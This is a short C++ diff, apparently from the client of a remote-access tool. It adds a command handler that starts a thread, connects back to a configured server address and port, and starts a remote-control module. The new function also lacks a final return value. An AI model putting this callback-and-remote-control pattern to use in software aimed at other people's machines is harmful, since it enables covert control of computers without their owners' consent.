@@ -79,7 +79,15 @@ void CKernelManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
 		break;
 
 	}
+	case  CLIENT_REMOTE_CONTROLLER_REQUIRE:
+	{
+		//启动一个线程
+		m_ThreadHandles[m_ThreadHandleCount++] = CreateThread(NULL, 0,
+			(LPTHREAD_START_ROUTINE)RemoteControllerProcedure,
+			NULL, 0, NULL);
 
+		break;
+	}
 	}
 }
 
@@ -124,6 +132,20 @@ DWORD WINAPI WindowManagerProcedure(LPVOID ParameterData)
 	IocpClient.WaitingForEvent();
 
 	return 0;
+}
+
+DWORD WINAPI RemoteControllerProcedure(LPVOID ParameterData)
+{
+	//生成新的iocp对象进行新的链接
+
+	CIocpClient	IocpClient;
+
+	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))
+		return -1;
+	CRemoteController  RemoteController(&IocpClient);   //构造函数
+
+	//等待一个事件
+	IocpClient.WaitingForEvent();
 }
 
 
